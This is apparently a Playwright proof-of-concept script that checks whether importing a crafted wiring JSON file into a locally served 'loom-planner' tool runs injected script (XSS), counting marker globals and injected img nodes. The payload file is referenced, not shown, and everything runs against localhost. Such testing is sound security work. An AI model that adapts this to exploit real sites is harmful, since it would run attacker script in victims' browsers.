import pkg from '/opt/node22/lib/node_modules/playwright/index.js';
const { chromium } = pkg;

const browser = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' });
const page = await browser.newPage();
const errors = [];
page.on('pageerror', e => errors.push('PAGEERROR: ' + e.message));
page.on('console', m => { if (m.type() === 'error') errors.push('CONSOLE: ' + m.text()); });

await page.goto('http://localhost:8788/tools/loom-planner/index.html', { waitUntil: 'networkidle' });

// Real user path: click "Import JSON" on the wiring tab, choose the attacker's file.
await page.evaluate(() => { try { localStorage.clear(); } catch (e) {} });
await page.goto('http://localhost:8788/tools/loom-planner/index.html', { waitUntil: 'networkidle' });

const [chooser] = await Promise.all([
  page.waitForEvent('filechooser'),
  page.click('#wire-import'),
]);
await chooser.setFiles(new URL('./loom-planner-wiring-xss.json', import.meta.url).pathname);
await page.waitForTimeout(1500);

const res = await page.evaluate(() => ({
  wireGroup: !!window.__XSS_WIREGROUP,
  connGroup: !!window.__XSS_CONNGROUP,
  injectedImgs: document.querySelectorAll('img[src="x"]').length,
}));

console.log('--- LOOM-PLANNER IMPORT XSS PoC (main site) ---');
console.log('window.__XSS_WIREGROUP set :', res.wireGroup);
console.log('window.__XSS_CONNGROUP set :', res.connGroup);
console.log('injected <img src=x> nodes :', res.injectedImgs);
console.log('XSS EXECUTED             :', res.wireGroup || res.connGroup);
if (errors.length) console.log('page errors:', errors.slice(0, 5));

await browser.close();
